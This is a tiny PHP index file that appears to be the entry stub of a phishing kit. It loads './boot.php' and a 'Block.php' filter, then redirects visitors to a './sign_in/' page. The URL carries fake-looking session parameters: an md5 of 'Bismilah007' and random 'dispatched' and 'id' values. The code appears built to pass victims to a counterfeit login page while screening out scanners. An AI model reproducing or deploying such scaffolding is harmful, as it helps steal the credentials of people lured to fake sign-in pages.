<?php

include('./boot.php');
include('./Block.php');
header("location:./sign_in/?websrc=".md5('Bismilah007')."?websrc=&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");

?>